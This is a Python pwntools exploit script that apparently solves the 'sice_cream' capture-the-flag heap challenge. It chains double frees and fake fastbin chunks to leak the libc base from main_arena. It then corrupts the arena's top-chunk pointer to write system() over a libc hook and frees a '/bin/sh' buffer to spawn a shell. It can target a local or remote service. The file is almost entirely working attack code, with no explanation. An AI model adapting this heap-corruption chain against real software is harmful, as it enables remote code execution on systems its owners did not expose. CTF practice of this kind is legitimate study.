#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('sice_cream_patched')
libc = exe.libc
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
dir /home/mark/Desktop/BinExp/Challs/HEAP/SiceCream/
b *0x400AE4
commands
    b *_int_free+0x280
end
d 1
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def buy_sice_cream(size, data):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b">", str(size).encode())
    io.sendafter(b">", data)


def eat_sice_cream(idx):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b">", str(idx).encode())


def reintroduce_yourself(new_name):
    io.sendlineafter(b">", b"3")
    io.sendafter(b">", new_name)


def sendName():
    global name
    name = 0x602040

    fake_chunk = p64(0x0) + p64(0x21)
    io.sendafter(b">", fake_chunk)


def doubleFree(a, b):
    eat_sice_cream(a)
    eat_sice_cream(b)
    eat_sice_cream(a)


def clearSicePtrs(idx):
    reintroduce_yourself(p64(0) + p64(0x61) + p64(0)*11 + p64(0x21) + p64(0)*17 + p64(0x61))
    eat_sice_cream(idx)
    reintroduce_yourself(p64(0) + p64(0x61) + p64(0x602130))
    buy_sice_cream(0x58, b"A"*8)
    buy_sice_cream(0x58, p64(0x0) * (0x58 // 8))


def createFakeChunk(idx, addr, size):
    fake_chunk = p64(0x0) + p64(0x21) + p64(0x0)
    reintroduce_yourself(fake_chunk)
    
    doubleFree(0, 1)
    buy_sice_cream(16, p64(addr))

    for _ in range(3):
        buy_sice_cream(16, b"A"*8)

    new_size = 0x21
    fake_chunk_size = size
    new_chunk = p64(0x0) + p64(fake_chunk_size)
    new_chunk += b"A" * (fake_chunk_size - 0x9) + p64(new_size)

    reintroduce_yourself(new_chunk)
    eat_sice_cream(idx)


def libcLeak():
    
    buy_sice_cream(16, b"A"*8)
    buy_sice_cream(16, b"B"*8)

    doubleFree(0, 1)

    buy_sice_cream(16, p64(name))

    for _ in range(3):
        buy_sice_cream(16, b"A"*8)

    new_size = 0x21
    fake_chunk_size = 0x91
    new_chunk = p64(0x0) + p64(fake_chunk_size)
    new_chunk += b"A" * (fake_chunk_size - 0x9) + p64(new_size)
    new_chunk += b"\x00" * (0x20 - 8) + p64(0x21)

    reintroduce_yourself(new_chunk)
    eat_sice_cream(5)

    reintroduce_yourself(b"A"*0x10)
    io.recvuntil(b"A"*0x10)
    data = io.recvline()[:6]
    main_arena = u64(data.ljust(8, b"\x00")) - 88
    libc.address = main_arena - libc.sym["main_arena"]
    info("libc base: %#x", libc.address)

    reintroduce_yourself(p64(0x00) + p64(0x91))
    buy_sice_cream(0x58, b"A"*8)
    buy_sice_cream(0x20, b"B"*8)


def writeToArena():

    createFakeChunk(11, name, 0x61)

    arena = libc.address + 0x3c4b22
    chunk_fd = p64(0x0) + p64(0x61) + p64(arena)

    new_size = 0x21
    fake_chunk_size = 0x21
    new_chunk = p64(0x0) + p64(fake_chunk_size)
    new_chunk += b"A" * (fake_chunk_size - 0x9) + p64(new_size)

    reintroduce_yourself(chunk_fd)
    buy_sice_cream(0x58, b"junk")
    reintroduce_yourself(new_chunk)
    eat_sice_cream(12)

    fastbins =  b"\x00"*6 + p64(0x0) * 8
    top_chunk = p64(libc.address + 0x3c5c5d - 0x8)
    main_arena_data = fastbins + top_chunk
    buy_sice_cream(0x58, main_arena_data)

    clearSicePtrs(5)

def padAllocate():
    for i in range(4):
        for _ in range(9):
            buy_sice_cream(0x48, b"A")

        clearSicePtrs(11)

    payload = b"\x00" * 3 + p64(libc.sym["system"])
    buy_sice_cream(0x48, payload)


def getShell():
    bin_sh = p64(0x0) * 2 + b"/bin/sh\x00"
    reintroduce_yourself(bin_sh)
    eat_sice_cream(11)


def solve():

    sendName()
    libcLeak()
    writeToArena()
    padAllocate()
    getShell()

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

